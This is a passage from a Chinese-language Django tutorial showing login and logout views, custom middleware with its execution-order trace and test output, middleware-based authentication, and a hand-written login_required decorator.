            <span style="color: #a020f0;">return</span> JsonResponse(Messages.USER_EXISTS)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25968;&#25454;&#23384;&#20648;</span>
        <span style="color: #a0522d;">email</span> = payload[<span style="color: #8b2252;">'email'</span>]
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #a0522d;">user</span> = User.objects.create_user(username, email, password)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19968;&#26086;&#21019;&#24314;&#25104;&#21151;&#65292;&#30331;&#24405;&#25104;&#21151;&#30475;&#21040;&#30340;&#26159;User&#23454;&#20363;</span>

        <span style="color: #a020f0;">return</span> JsonResponse({}, status=201)
        <span style="color: #b22222;">#</span><span style="color: #b22222;">return HttpResponse(content_type='application/json', status=201)</span>
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)

<span style="color: #228b22;">@require_POST</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">user_login</span>(request:HttpRequest):
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#36827;&#20837;&#21040;&#35270;&#22270;&#20989;&#25968;&#20013;&#65292;request&#20013;&#24212;&#35813;&#26377;2&#20010;&#21160;&#24577;&#22686;&#21152;&#30340;&#23646;&#24615;&#65292;session&#12289;user, &#21644;&#20013;&#38388;&#20214;&#26377;&#20851;</span>
    <span style="color: #483d8b;">print</span>(request.path)
    <span style="color: #483d8b;">print</span>(request.method)
    <span style="color: #483d8b;">print</span>(request.body)
    <span style="color: #483d8b;">print</span>(request.content_type) <span style="color: #b22222;">#</span><span style="color: #b22222;">application/json</span>
    <span style="color: #483d8b;">print</span>()
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(payload), payload) <span style="color: #b22222;">#</span><span style="color: #b22222;">dict</span>
        <span style="color: #a0522d;">username</span> = payload[<span style="color: #8b2252;">'username'</span>] <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30331;&#24405;  &#35813;&#22914;&#20309;&#22788;&#29702;&#65311;</span>
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35748;&#35777;&#20989;&#25968;&#65292;&#35299;&#20915;&#29992;&#25143;&#21517;&#21644;&#23494;&#30721;&#21305;&#37197;&#38382;&#39064;&#65292;&#21305;&#37197;&#25104;&#21151;&#21644;&#25968;&#25454;&#24211;&#35760;&#24405;&#19968;&#19968;&#23545;&#24212;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30495;&#23454;&#23384;&#22312;&#30340;&#29992;&#25143;&#65292;is_authenticated&#27704;&#36828;&#20026;true</span>
        <span style="color: #a0522d;">user</span> = authenticate(username=username, password=password)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(request.user), request.user)  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#30446;&#21069;&#26159;&#21311;&#21517;&#30340;&#12290;&#21311;&#21517;&#29992;&#25143;&#20063;&#26159;&#29992;&#25143;&#65292;&#20294;is_authenticated&#27704;&#36828;&#20026;false</span>
        <span style="color: #483d8b;">print</span>(request.session)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span>*30)
        <span style="color: #a020f0;">if</span> user:
            <span style="color: #b22222;"># </span><span style="color: #b22222;">cookie&#21644;session&#65292;&#39318;&#20808;&#20320;&#24517;&#39035;&#23545;&#35748;&#35777;&#25104;&#21151;&#32773;&#21457;&#19968;&#20010;&#36523;&#20221;id&#65292;response&#20013;&#22686;&#21152;set-cookie</span>
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33267;&#23569;&#24212;&#35813;&#26377;sessionID&#65292;sessionID&#24517;&#39035;&#20445;&#23384;&#22312;&#26381;&#21153;&#22120;&#31471;</span>
            login(request, user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21508;&#31181;&#21518;&#21488;jsp, php&#37117;&#20064;&#24815;&#36890;&#36807;request.session&#21462;session&#20540;&#65307;user&#32465;&#23450;&#21040;request&#19978;</span>
            <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user)
            <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(request.user), request.user)
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'=*'</span>*30)
            <span style="color: #a0522d;">response</span> = HttpResponse(status=204)
            <span style="color: #b22222;"># </span><span style="color: #b22222;">response.set_cookie('xxx')</span>
            <span style="color: #a020f0;">return</span> HttpResponse(status=204) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#29992;&#25143;&#39564;&#35777;&#25104;&#21151;&#65292;&#20043;&#21518;&#24590;&#20040;&#22788;&#29702;&#65311;</span>
        <span style="color: #a020f0;">else</span>:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.INVALID_USERNAME_OR_PASSWORD, status=200)
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)

<span style="color: #b22222;"># </span><span style="color: #b22222;">@login_required  # &#31561;&#20215;&#20110; user_logout = login_required(user_logout)</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">@login_required(login_url='users/login') # &#31561;&#20215;&#20110; user_logout = login_required(login_url='users/login')(user_logout)</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">user_logout</span>(request:HttpRequest):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'^^^^ view function user_logout'</span>)
    <span style="color: #483d8b;">print</span>(request.user)
    <span style="color: #483d8b;">print</span>(request.user.<span style="color: #483d8b;">__dict__</span>)
    <span style="color: #a020f0;">if</span> request.user.is_authenticated:
        <span style="color: #a0522d;">s</span> = 200
    <span style="color: #a020f0;">else</span>:
        <span style="color: #a0522d;">s</span> = 400
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'^'</span>*30)
    <span style="color: #a020f0;">return</span> JsonResponse({}, status=s)

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">SimpleMiddleware1</span>:
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__init__</span>(<span style="color: #a020f0;">self</span>, get_response):
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">get_response</span> = get_response

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__call__</span>(<span style="color: #a020f0;">self</span>, request):
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#27599;&#19968;&#20010;&#20013;&#38388;&#20214;&#36820;&#22238;response&#20043;&#21069;&#35843;&#29992;&#65292;&#20570;request&#22788;&#29702;</span>
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'=-'</span>*30)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'SimpleMiddleware1 before response; process_request'</span>)
        <span style="color: #483d8b;">print</span>(request.session.items())
        <span style="color: #483d8b;">print</span>(request.user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20320;&#22312;&#35748;&#35777;&#20013;&#38388;&#20214;&#20043;&#21518; </span>

        <span style="color: #a0522d;">response</span> = <span style="color: #a020f0;">self</span>.get_response(request) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35843;&#29992;&#19979;&#19968;&#20010;</span>

        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21487;&#33021;&#23545;request&#21644;response&#20570;&#22788;&#29702;</span>
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'SimpleMiddleware1 after response; process_response'</span>)
        <span style="color: #483d8b;">print</span>(response)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'=~'</span>*30)
        <span style="color: #a020f0;">return</span> response

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">process_view</span>(<span style="color: #a020f0;">self</span>, request, view_func, view_args, view_kwargs):
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'SimpleMiddleware1 process_view start ++++'</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35270;&#22270;&#20989;&#25968;&#25191;&#34892;&#20043;&#21069;</span>
        <span style="color: #483d8b;">print</span>(view_func)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'SimpleMiddleware1 process_view end ++++'</span>)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">return None # &#22914;&#26524;&#36820;&#22238;None&#65292;&#19981;&#24433;&#21709;&#27969;&#31243;&#65292;&#32487;&#32493;&#21521;&#21518;&#35843;&#29992;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">return HttpResponse('M1&#25925;&#24847;&#30340;', status=404) # &#19981;&#20250;&#21521;&#21518;&#35843;&#29992;&#65292;&#20174;&#27492;&#22788;&#36820;&#22238;</span>

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">SimpleMiddleware2</span>:
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__init__</span>(<span style="color: #a020f0;">self</span>, get_response):
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">get_response</span> = get_response

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__call__</span>(<span style="color: #a020f0;">self</span>, request):
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#27599;&#19968;&#20010;&#20013;&#38388;&#20214;&#36820;&#22238;response&#20043;&#21069;&#35843;&#29992;&#65292;&#20570;request&#22788;&#29702;</span>
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'=-'</span>*30)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'SimpleMiddleware2 before response; process_request'</span>)
        <span style="color: #483d8b;">print</span>(request.session.items())
        <span style="color: #483d8b;">print</span>(request.user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20320;&#22312;&#35748;&#35777;&#20013;&#38388;&#20214;&#20043;&#21518; </span>

        <span style="color: #a0522d;">response</span> = <span style="color: #a020f0;">self</span>.get_response(request) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35843;&#29992;&#19979;&#19968;&#20010;</span>

        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21487;&#33021;&#23545;request&#21644;response&#20570;&#22788;&#29702;</span>
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'SimpleMiddleware2 after response; process_response'</span>)
        <span style="color: #483d8b;">print</span>(response)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'=~'</span>*30)
        <span style="color: #a020f0;">return</span> response

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">process_view</span>(<span style="color: #a020f0;">self</span>, request, view_func, view_args, view_kwargs):
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'SimpleMiddleware2 process_view start ++++'</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35270;&#22270;&#20989;&#25968;&#25191;&#34892;&#20043;&#21069;</span>
        <span style="color: #483d8b;">print</span>(view_func)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'SimpleMiddleware2 process_view end ++++'</span>)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">return None # &#22914;&#26524;&#36820;&#22238;None&#65292;&#19981;&#24433;&#21709;&#27969;&#31243;&#65292;&#32487;&#32493;&#21521;&#21518;&#35843;&#29992;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">return HttpResponse('M2&#25925;&#24847;&#30340;', status=404) # &#19981;&#20250;&#21521;&#21518;&#35843;&#29992;&#65292;&#20174;&#27492;&#22788;&#36820;&#22238;</span>
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">settings.py, &#22686;&#21152;&#20013;&#38388;&#20214;</span>
<span style="color: #a0522d;">MIDDLEWARE</span> = [
    <span style="color: #8b2252;">'django.middleware.security.SecurityMiddleware'</span>,
    <span style="color: #8b2252;">'django.contrib.sessions.middleware.SessionMiddleware'</span>,
    <span style="color: #8b2252;">'django.middleware.common.CommonMiddleware'</span>,
    <span style="color: #b22222;"># </span><span style="color: #b22222;">'django.middleware.csrf.CsrfViewMiddleware',</span>
    <span style="color: #8b2252;">'django.contrib.auth.middleware.AuthenticationMiddleware'</span>,
    <span style="color: #8b2252;">'django.contrib.messages.middleware.MessageMiddleware'</span>,
    <span style="color: #8b2252;">'django.middleware.clickjacking.XFrameOptionsMiddleware'</span>,
    <span style="color: #8b2252;">'user.views.SimpleMiddleware1'</span>, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20840;&#23616;&#36807;&#28388;</span>
    <span style="color: #8b2252;">'user.views.SimpleMiddleware2'</span>, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20840;&#23616;&#36807;&#28388;</span>
]
</pre>
</div>

<p>
测试
</p>
<div class="org-src-container">
<pre class="src src-nil">curl --location '127.0.0.1:8000/users/logout' \
--header 'Content-Type: application/json' \
--data-raw '{
    "password":"adminadmin",
    "username":"admin",
    "email":"xdd@xdd.com"
}
'
</pre>
</div>

<p>
代码输出
</p>
<div class="org-src-container">
<pre class="src src-sh">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
SimpleMiddleware1 before response; process_request
<span style="color: #0000ff;">dict_items</span>([])
AnonymousUser
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
SimpleMiddleware2 before response; process_request
<span style="color: #0000ff;">dict_items</span>([])
AnonymousUser
SimpleMiddleware1 process_view start ++++
&lt;<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">user_logout</span> at 0x0000018FA170A3E0&gt;
SimpleMiddleware1 process_view end ++++
SimpleMiddleware2 process_view start ++++
&lt;<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">user_logout</span> at 0x0000018FA170A3E0&gt;
SimpleMiddleware2 process_view end ++++
^^^^ view <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">user_logout</span>
AnonymousUser
{<span style="color: #8b2252;">'_setupfunc'</span>: &lt;<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">AuthenticationMiddleware.process_request.</span>&lt;locals&gt;.&lt;lambda&gt; at 0x0000018FA188A8E0&gt;, <span style="color: #8b2252;">'_wrapped'</span>: &lt;django.contrib.auth.models.AnonymousUser object at 0x0000018FA1984830&gt;}
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SimpleMiddleware2 after response; process_response
&lt;JsonResponse <span style="color: #a0522d;">status_code</span>=400, <span style="color: #8b2252;">"application/json"</span>&gt;
=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~
SimpleMiddleware1 after response; process_response
&lt;JsonResponse <span style="color: #a0522d;">status_code</span>=400, <span style="color: #8b2252;">"application/json"</span>&gt;
=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~
Bad Request: /users/logout
[26/Jul/2025 18:09:59] <span style="color: #8b2252;">"POST /users/logout HTTP/1.1"</span> 400 2
</pre>
</div>

<p>
<a href="https://docs.djangoproject.com/en/1.8/topics/http/middleware/#writing-your-own-middleware">流程图</a> 
</p>


<figure id="org61e36e4">
<img src="https://raw.githubusercontent.com/jaspervincent/webimage/master/python/images/img_20250726_175923.png" alt="img_20250726_175923.png" width="50%">

</figure>

<p>
结论
</p>
<ol class="org-ol">
<li>Django中间件使用的洋葱式，但有特殊的地方</li>
<li>新版本中间件现在=__call__=中get_response(request)之前代码(相当于老版本中的process_request)</li>
<li>settings中的顺序先后执行所有中间件的get_response(request)之前代码</li>
<li>全部执行完解析路径映射得到view_func</li>
<li>settings中顺序先后执行process_view部分
<ul class="org-ul">
<li>return None 继续向后执行</li>
<li>return HttpResponse()
就不在执行其他函数的preview函数了，此函数返回值作为浏览器端的响应</li>
</ul></li>
<li>执行view函数，前提是签名的所有中间件process_view都返回None</li>
<li>逆序执行所有中间件的get_response(request)之后代码</li>
<li>特别注意，如果get_response(request)之前代码中return HttpResponse(),将从当前中间件立即返回给浏览器端，从洋葱中依次反弹</li>
</ol>
</div>
</div>
<div id="outline-container-h:e6a7132e-970a-4642-924b-8d20638b8065" class="outline-4">
<h4 id="h:e6a7132e-970a-4642-924b-8d20638b8065">自定义中间件用户验证</h4>
<div class="outline-text-4" id="text-h:e6a7132e-970a-4642-924b-8d20638b8065">
<p>
范例：实现认证，上例内容
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">user/views.py</span>
...., 
<span style="color: #a020f0;">class</span> <span style="color: #228b22;">SimpleMiddleware1</span>:
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__init__</span>(<span style="color: #a020f0;">self</span>, get_response):
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">get_response</span> = get_response
        <span style="color: #b22222;"># </span><span style="color: #b22222;">One-time configuration and initialization.</span>

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__call__</span>(<span style="color: #a020f0;">self</span>, request):
        <span style="color: #b22222;"># </span><span style="color: #b22222;">Code to be executed for each request before</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">the view (and later middleware) are called.</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#27599;&#19968;&#20010;&#20013;&#38388;&#20214;&#36820;&#22238;response&#20043;&#21069;&#35843;&#29992;&#65292;&#20570;request&#22788;&#29702;</span>
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'=-'</span>*30)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'SimpleMiddleware1 before response'</span>)
        <span style="color: #483d8b;">print</span>(request.session.items())
        <span style="color: #483d8b;">print</span>(request.user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20320;&#22312;&#35748;&#35777;&#20013;&#38388;&#20214;&#20043;&#21518; </span>
        <span style="color: #a020f0;">if</span> request.user.is_authenticated:
            <span style="color: #a0522d;">response</span> = <span style="color: #a020f0;">self</span>.get_response(request) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35843;&#29992;&#19979;&#19968;&#20010;</span>

            <span style="color: #b22222;"># </span><span style="color: #b22222;">Code to be executed for each request/response after</span>
            <span style="color: #b22222;"># </span><span style="color: #b22222;">the view is called.</span>
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21487;&#33021;&#23545;request&#21644;response&#20570;&#22788;&#29702;</span>
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'SimpleMiddleware1 after response'</span>)
            <span style="color: #483d8b;">print</span>(response)
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'=~'</span>*30)

            <span style="color: #a020f0;">return</span> response
        <span style="color: #a020f0;">else</span>:
            <span style="color: #a020f0;">return</span> HttpResponse(<span style="color: #8b2252;">'&#25552;&#21069;&#32467;&#26463;&#20102;'</span>, status=401)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20462;&#25913;blog/settings.py&#25991;&#20214;&#65292;&#28155;&#21152;&#28040;&#24687;&#20013;&#38388;&#20214;</span>

<span style="color: #a0522d;">MIDDLEWARE</span> = [
    ...,
    <span style="color: #8b2252;">'user.views.SimpleMiddleware1'</span>, <span style="color: #b22222;">#</span><span style="color: #b22222;">&#22686;&#21152;&#35813;&#20013;&#38388;&#20214;</span>
]
</pre>
</div>

<ol class="org-ol">
<li>中间件拦截所有视图函数，但是只有一部分请求需要提供认证，所以考虑其他方法。</li>
<li>如果绝大多数都需要拦截，个别例外，采用中间件比较合适。</li>
<li>中间件有很多用户，适合拦截所有请求和响应。例如浏览器端的IP是否禁用、UserAgent分析、异常响应的统一处理。</li>
</ol>
</div>
</div>
</div>
<div id="outline-container-h:95961e71-ed97-4390-8c9a-7b5ee7a6b5fb" class="outline-3">
<h3 id="h:95961e71-ed97-4390-8c9a-7b5ee7a6b5fb">装饰器</h3>
<div class="outline-text-3" id="text-h:95961e71-ed97-4390-8c9a-7b5ee7a6b5fb">
<p>
django.contrib.auth.decorators.login_required 它会在服务器端跳转，不适合前后端分离。所以参照它，自己实现装饰器。
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpRequest, HttpResponse, JsonResponse
<span style="color: #a020f0;">from</span> django.contrib.auth.models <span style="color: #a020f0;">import</span> User
<span style="color: #a020f0;">from</span> django.contrib.auth <span style="color: #a020f0;">import</span> authenticate, login, logout
<span style="color: #a020f0;">from</span> django.views.decorators.http <span style="color: #a020f0;">import</span> require_GET, require_POST, require_http_methods
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.contrib.auth.decorators import login_required  #&#20889;&#30340;&#38750;&#24120;&#22909;</span>
<span style="color: #a020f0;">from</span> functools <span style="color: #a020f0;">import</span> wraps
<span style="color: #a020f0;">from</span> django.contrib.sessions.backends.db <span style="color: #a020f0;">import</span> SessionStore
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages

<span style="color: #228b22;">@require_POST</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">reg</span>(request:HttpRequest):
    <span style="color: #483d8b;">print</span>(request.path)
    <span style="color: #483d8b;">print</span>(request.GET)  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#35810;&#23383;&#31526;&#20018;</span>
    <span style="color: #483d8b;">print</span>(request.POST) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#34920;&#21333;&#25552;&#20132;</span>
    <span style="color: #483d8b;">print</span>(request.method)
    <span style="color: #483d8b;">print</span>(request.body)
    <span style="color: #483d8b;">print</span>(request.content_type) <span style="color: #b22222;">#</span><span style="color: #b22222;">application/json</span>
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(payload), payload)
        <span style="color: #a0522d;">username</span> = payload.get(<span style="color: #8b2252;">'username'</span>)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21028;&#26029;&#29992;&#25143;&#21517;&#26159;&#21542;&#23384;&#22312;&#65311;&#27983;&#35272;&#22120;&#31471;&#26377;&#27809;&#26377;&#25552;&#37266;&#36807;&#29992;&#25143;&#65292;&#27704;&#36828;&#19981;&#35201;&#30456;&#20449;&#23458;&#25143;&#31471;</span>
        <span style="color: #a0522d;">count</span> = User.objects.<span style="color: #483d8b;">filter</span>(username=username).count()
        <span style="color: #a020f0;">if</span> count&gt;0:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.USER_EXISTS)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25968;&#25454;&#23384;&#20648;</span>
        <span style="color: #a0522d;">email</span> = payload[<span style="color: #8b2252;">'email'</span>]
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #a0522d;">user</span> = User.objects.create_user(username, email, password)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19968;&#26086;&#21019;&#24314;&#25104;&#21151;&#65292;&#30331;&#24405;&#25104;&#21151;&#30475;&#21040;&#30340;&#26159;User&#23454;&#20363;</span>

        <span style="color: #a020f0;">return</span> JsonResponse({}, status=201)
        <span style="color: #b22222;">#</span><span style="color: #b22222;">return HttpResponse(content_type='application/json', status=201)</span>
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)

<span style="color: #228b22;">@require_POST</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">user_login</span>(request:HttpRequest):
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#36827;&#20837;&#21040;&#35270;&#22270;&#20989;&#25968;&#20013;&#65292;request&#20013;&#24212;&#35813;&#26377;2&#20010;&#21160;&#24577;&#22686;&#21152;&#30340;&#23646;&#24615;&#65292;session&#12289;user, &#21644;&#20013;&#38388;&#20214;&#26377;&#20851;</span>
    <span style="color: #483d8b;">print</span>(request.path)
    <span style="color: #483d8b;">print</span>(request.method)
    <span style="color: #483d8b;">print</span>(request.body)
    <span style="color: #483d8b;">print</span>(request.content_type) <span style="color: #b22222;">#</span><span style="color: #b22222;">application/json</span>
    <span style="color: #483d8b;">print</span>()
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(payload), payload) <span style="color: #b22222;">#</span><span style="color: #b22222;">dict</span>
        <span style="color: #a0522d;">username</span> = payload[<span style="color: #8b2252;">'username'</span>] <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30331;&#24405;  &#35813;&#22914;&#20309;&#22788;&#29702;&#65311;</span>
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35748;&#35777;&#20989;&#25968;&#65292;&#35299;&#20915;&#29992;&#25143;&#21517;&#21644;&#23494;&#30721;&#21305;&#37197;&#38382;&#39064;&#65292;&#21305;&#37197;&#25104;&#21151;&#21644;&#25968;&#25454;&#24211;&#35760;&#24405;&#19968;&#19968;&#23545;&#24212;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30495;&#23454;&#23384;&#22312;&#30340;&#29992;&#25143;&#65292;is_authenticated&#27704;&#36828;&#20026;true</span>
        <span style="color: #a0522d;">user</span> = authenticate(username=username, password=password)
        <span style="color: #483d8b;">print</span>(user.is_authenticated, <span style="color: #8b2252;">'--------'</span>)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span>*30)
        <span style="color: #a020f0;">if</span> user <span style="color: #a020f0;">and</span> user.is_active: <span style="color: #b22222;">#</span><span style="color: #b22222;">&#29992;&#25143;&#23494;&#30721;&#27491;&#30830;</span>
            <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user, user.is_authenticated)
            <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(request.user), request.user, request.user.is_authenticated)
            login(request, user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21508;&#31181;&#21518;&#21488;jsp, php&#37117;&#20064;&#24815;&#36890;&#36807;request.session&#21462;session&#20540;&#65307;user&#32465;&#23450;&#21040;request&#19978;</span>
            <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user, user.is_authenticated)
            <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(request.user), request.user, request.user.is_authenticated)
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'=*'</span>*30)
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#26377;&#24517;&#35201;&#65292;&#21487;&#20197;&#20351;&#29992;session&#20445;&#23384;&#19968;&#20123;&#20449;&#24687;</span>
            <span style="color: #a0522d;">session</span>:<span style="color: #228b22;">SessionStore</span> = request.session
            <span style="color: #b22222;"># </span><span style="color: #b22222;">session.set_expiry(60*60*24) # &#35774;&#32622;&#36807;&#26399;&#26102;&#38388;&#65292;&#21333;&#20301;&#31186;</span>
            <span style="color: #a0522d;">session</span>[<span style="color: #8b2252;">'user_info'</span>] = {
                <span style="color: #8b2252;">'id'</span>: request.user.<span style="color: #483d8b;">id</span>,
                <span style="color: #8b2252;">'username'</span>:request.user.username
            }
            <span style="color: #b22222;"># </span><span style="color: #b22222;">response.set_cookie('xxx')</span>
            <span style="color: #a020f0;">return</span> JsonResponse({}) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992;&#20102;login&#20989;&#25968;&#65292;&#36820;&#22238;&#26102;&#23601;&#24102;&#30528;set-cookie&#65292;&#35774;&#32622;sessionid</span>
        <span style="color: #a020f0;">else</span>:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.INVALID_USERNAME_OR_PASSWORD, status=200)
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #483d8b;">print</span>(e)
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">login_required</span>(viewfunc):
    <span style="color: #228b22;">@wraps</span>(viewfunc)
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">wrapper</span>(request, *args, **kwars):
        <span style="color: #a020f0;">if</span> request.user.is_authenticated:
            <span style="color: #a020f0;">return</span> viewfunc(request, *args, **kwars)
        <span style="color: #a020f0;">return</span> HttpResponse(status=401)
    <span style="color: #a020f0;">return</span> wrapper

<span style="color: #228b22;">@login_required</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">@login_required  # &#31561;&#20215;&#20110; user_logout = login_required(user_logout)</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">@login_required(login_url='users/login') # &#31561;&#20215;&#20110; user_logout = login_required(login_url='users/login')(user_logout)</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">user_logout</span>(request:HttpRequest):
